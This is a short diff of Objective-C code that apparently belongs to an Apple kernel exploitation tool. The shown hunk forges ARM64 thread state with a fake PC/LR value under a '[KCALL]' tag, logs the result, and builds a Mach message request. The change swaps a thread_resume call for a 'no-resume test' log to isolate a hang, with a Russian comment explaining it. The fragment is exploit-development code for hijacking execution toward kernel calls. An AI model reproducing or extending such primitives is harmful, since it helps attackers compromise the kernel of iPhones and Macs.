@@ -2480,7 +2480,8 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         st.__opaque_lr = (void *)(uintptr_t)0x401;
                                         kern_return_t ssr = thread_set_state(hp, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
                                         { NSString *s = [NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x resume\n", ssr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                        thread_resume(hp);
+                                        // 2.0.133: НЕ resume — изолируем зависание
+                                        { NSString *ss = @"no-resume test\n"; NSFileHandle *fh2 = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh2) { [fh2 seekToEndOfFile]; [fh2 writeData:[ss dataUsingEncoding:NSUTF8StringEncoding]]; [fh2 closeFile]; } kpNote(r, @"  [KCALL] no-resume test"); }
                                         // Request: 2406, до 0x40+68*4 = 0x150 байт достаточно
                                         uint8_t req[0x200]; memset(req, 0, sizeof(req));
                                         mach_msg_header_t *rh = (mach_msg_header_t *)req;
